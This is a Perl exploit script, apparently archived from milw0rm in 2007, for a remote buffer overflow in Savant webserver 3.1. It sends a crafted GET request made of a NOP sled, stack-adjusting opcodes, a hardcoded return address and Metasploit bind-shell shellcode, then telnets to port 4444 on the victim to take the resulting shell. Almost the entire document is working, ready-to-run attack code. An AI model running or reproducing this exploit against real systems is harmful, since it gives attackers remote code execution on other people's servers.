#!/usr/bin/perl -w
# exploit for Savant webserver 3.1 remote bof
# shellcode bind 4444 port on target host
# 
#
# Jacopo cervini aka acaro@jervus.it
#
use IO::Socket;

if(!($ARGV[1]))
{
 print "Uso: savant-3.1.pl <victim> <port>\n\n";
 exit;
}





$victim = IO::Socket::INET->new(Proto=>'tcp',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                        or die "can't connect on $ARGV[0] sulla porta $ARGV[1]";

#Metasploit shellcode

$shellcode = 
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb5".
"\x55\x45\xd4\x83\xeb\xfc\xe2\xf4\x49\x3f\xae\x99\x5d\xac\xba\x2b".
"\x4a\x35\xce\xb8\x91\x71\xce\x91\x89\xde\x39\xd1\xcd\x54\xaa\x5f".
"\xfa\x4d\xce\x8b\x95\x54\xae\x9d\x3e\x61\xce\xd5\x5b\x64\x85\x4d".
"\x19\xd1\x85\xa0\xb2\x94\x8f\xd9\xb4\x97\xae\x20\x8e\x01\x61\xfc".
"\xc0\xb0\xce\x8b\x91\x54\xae\xb2\x3e\x59\x0e\x5f\xea\x49\x44\x3f".
"\xb6\x79\xce\x5d\xd9\x71\x59\xb5\x76\x64\x9e\xb0\x3e\x16\x75\x5f".
"\xf5\x59\xce\xa4\xa9\xf8\xce\x94\xbd\x0b\x2d\x5a\xfb\x5b\xa9\x84".
"\x4a\x83\x23\x87\xd3\x3d\x76\xe6\xdd\x22\x36\xe6\xea\x01\xba\x04".
"\xdd\x9e\xa8\x28\x8e\x05\xba\x02\xea\xdc\xa0\xb2\x34\xb8\x4d\xd6".
"\xe0\x3f\x47\x2b\x65\x3d\x9c\xdd\x40\xf8\x12\x2b\x63\x06\x16\x87".
"\xe6\x06\x06\x87\xf6\x06\xba\x04\xd3\x3d\x54\x88\xd3\x06\xcc\x35".
"\x20\x3d\xe1\xce\xc5\x92\x12\x2b\x63\x3f\x55\x85\xe0\xaa\x95\xbc".
"\x11\xf8\x6b\x3d\xe2\xaa\x93\x87\xe0\xaa\x95\xbc\x50\x1c\xc3\x9d".
"\xe2\xaa\x93\x84\xe1\x01\x10\x2b\x65\xc6\x2d\x33\xcc\x93\x3c\x83".
"\x4a\x83\x10\x2b\x65\x33\x2f\xb0\xd3\x3d\x26\xb9\x3c\xb0\x2f\x84".
"\xec\x7c\x89\x5d\x52\x3f\x01\x5d\x57\x64\x85\x27\x1f\xab\x07\xf9".
"\x4b\x17\x69\x47\x38\x2f\x7d\x7f\x1e\xfe\x2d\xa6\x4b\xe6\x53\x2b".
"\xc0\x11\xba\x02\xee\x02\x17\x85\xe4\x04\x2f\xd5\xe4\x04\x10\x85".
"\x4a\x85\x2d\x79\x6c\x50\x8b\x87\x4a\x83\x2f\x2b\x4a\x62\xba\x04".
"\x3e\x02\xb9\x57\x71\x31\xba\x02\xe7\xaa\x95\xbc\x45\xdf\x41\x8b".
"\xe6\xaa\x93\x2b\x65\x55\x45\xd4";





$nop="\x90"x201;
$incbh="\xfe\xc7"x4;			# inc bh opcode
$incebx="\x43"x23;			# inc ebx opcode
$asm1 = "\x53\xc3";			# push ebx,ret opcode
$nop1="\x90"x19;
$asm = "\x83\xc4\x8c\x54\xc3";		# add esp,-74,pueh esp,ret for jump in $nop without a direct jmp because there are 						# some opcode not allowed and we have need of space for our shellcode 
$nop2="\x90"x210;


$eip = "\x74\x86\x41";			# 0x00418674 memory address of pop eax, ret in Savant.exe it's universal

$exploit = $asm.  " /". $nop.$incbh.$incebx .$asm1.$nop1. $eip ."\r\n\r\n" .$nop2.$shellcode;

print $victim $exploit;

print " + Malicious GET request sent ...\n";


print "Done.\n";


close($victim);

$host = $ARGV[0];
print " + connect to 4444 of $host ...\n";
sleep(3);
system("telnet $host 4444");

exit;

# milw0rm.com [2007-08-12]
